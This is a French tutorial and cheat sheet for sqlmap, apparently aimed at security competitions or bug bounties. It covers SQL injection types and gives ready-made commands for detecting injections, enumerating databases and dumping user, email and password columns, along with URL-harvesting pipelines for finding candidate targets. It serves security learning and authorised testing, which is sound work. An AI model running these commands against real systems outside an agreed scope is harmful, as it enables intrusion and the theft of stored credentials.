Introduction

Qu'est-ce que sqlmap ?

sqlmap est l’outil le plus connu pour détecter et exploiter automatiquement les injections SQL. Tu lui donnes une URL ou une requête, et il peut :

  • Détecter une SQLi
  • Identifier le type d’injection
  • Trouver le SGBD (MySQL, PostgreSQL, MSSQL...)
  • Lister les databases
  • Lister les tables / colonnes
  • Dumper les data
  • Parfois aller jusqu’à un shell selon le contexte
Quand l’utiliser le jour J ?
  • Quand tu vois des paramètres du type id=, page=, cat=, user=, product=
  • Quand une page réagit bizarrement à ' ou "
  • Quand Nuclei / tests manuels suggèrent une injection
  • Quand tu as une requête POST de login/search/filter
Position dans l’arsenal : recon → collecte d’URLs → filtre params → sqlmap → validation

Installation

Concepts SQLi

Types d’injection courants
Type Idée simple
Boolean-based La page change selon vrai/faux
Error-based Le SGBD renvoie des erreurs utiles
Union-based On fusionne des résultats SQL
Time-based Le serveur ralentit selon la condition
Stacked queries Plusieurs requêtes enchaînées
Paramètres souvent vulnérables
  • id, user_id, product_id
  • page, cat, category, item
  • sort, order, filter
  • search, q, query
Réflexe manuel rapide : teste ', ", 1 AND 1=1, 1 AND 1=2 avant de lancer un gros sqlmap.

Usage de base

1. Test simple d’une URL
sqlmap -u "https://target.com/page?id=1" --batch
2. Lister les bases
sqlmap -u "https://target.com/page?id=1" --batch --dbs
3. Lister les tables
sqlmap -u "https://target.com/page?id=1" --batch -D nom_db --tables
4. Dumper une table
sqlmap -u "https://target.com/page?id=1" --batch -D nom_db -T users --dump
5. Requête POST
sqlmap -u "https://target.com/login" \
  --data "username=admin&password=test" \
  --batch

Flags importants

Flag Rôle Quand s’en servir
-u URL cible Toujours
--data Body POST Formulaires
--batch Répond auto aux questions Mode rapide Jour J
--dbs Liste les databases Dès qu’une SQLi est confirmée
-D Choisir une database Enum tables
--tables Liste les tables Après --dbs
-T Choisir une table Dump ciblé
--dump Extraire les data Phase finale
--level Profondeur des tests (1-5) Si rien n’est trouvé
--risk Niveau de risque (1-3) Tests plus agressifs
-p Paramètre précis à tester Pour aller plus vite
--cookie Cookie authentifié Zone login / panel
--threads Parallélisme Accélérer
--technique Forcer un type (BEUST...) Cas avancés
-r Charger une requête Burp Requêtes complexes

Exemples détaillés

1. Scan rapide Jour J
sqlmap -u "https://target.com/item?id=1" --batch --dbs --threads 5
2. Forcer un paramètre
sqlmap -u "https://target.com/list?page=1&sort=asc" -p page --batch
3. Niveau plus agressif
sqlmap -u "https://target.com/page?id=1" --batch --level 3 --risk 2
4. Avec cookie de session
sqlmap -u "https://target.com/profile?id=2" \
  --cookie "PHPSESSID=abcdef123" \
  --batch --dbs
5. Depuis une requête Burp sauvegardée
sqlmap -r request.txt --batch --dbs
6. Dump ciblé users/emails/passwords
sqlmap -u "https://target.com/page?id=1" \
  --batch -D appdb -T users -C id,email,password --dump

Guide Jour J

Plan simple et efficace
  1. Fais d’abord subfinder + httpx + nuclei
  2. Récupère des URLs avec paramètres (`gau`, `katana`)
  3. Cible d’abord les params `id`, `page`, `cat`, `user`
  4. Lance sqlmap en `--batch --dbs`
  5. Si gagné : tables → dump ciblé
  6. Ne dump pas tout bêtement si tu n’as pas le temps
Commandes prêtes Jour J
# Test rapide
sqlmap -u "https://CIBLE/page?id=1" --batch --dbs --threads 5

# Si rien trouvé
sqlmap -u "https://CIBLE/page?id=1" --batch --level 3 --risk 2

# POST login / search
sqlmap -u "https://CIBLE/search" --data "q=test" --batch --dbs

# Requête Burp
sqlmap -r req.txt --batch --dbs
Priorisation Jour J : une SQLi confirmée avec accès DB vaut souvent plus qu’une XSS douteuse. Mais commence quand même par Nuclei pour les gains rapides.

Pipelines utiles

1. Collecte de candidats SQLi
gau target.com | grep "=" | grep -E "id=|page=|cat=|user=|product=" > sqli-candidates.txt
2. Avec gf sqli
cat all-urls.txt | gf sqli > sqli-candidates.txt
3. Tester une liste d’URLs
sqlmap -m sqli-candidates.txt --batch --dbs
Astuce : ne lance pas sqlmap sur 5000 URLs random. Filtre d’abord. La qualité des cibles > la quantité.

Tips Pro

1. Utilise toujours --batch en concours

Sinon sqlmap pose trop de questions et te fait perdre du temps.

2. Monte level/risk seulement si nécessaire
sqlmap -u "URL" --batch --level 3 --risk 2
3. Spécifie le paramètre avec -p

Plus rapide, moins de bruit, plus propre.

4. Sauvegarde les requêtes intéressantes depuis Burp

Les vraies cibles SQLi sont souvent dans des POST, cookies ou headers, pas seulement dans l’URL.

5. Ne dump pas tout immédiatement
  • Confirme la SQLi
  • Liste les DBs
  • Cherche les tables intéressantes (`users`, `accounts`, `admin`)
  • Dump ciblé
Rappel : sqlmap uniquement sur les cibles autorisées du concours / de ton scope.
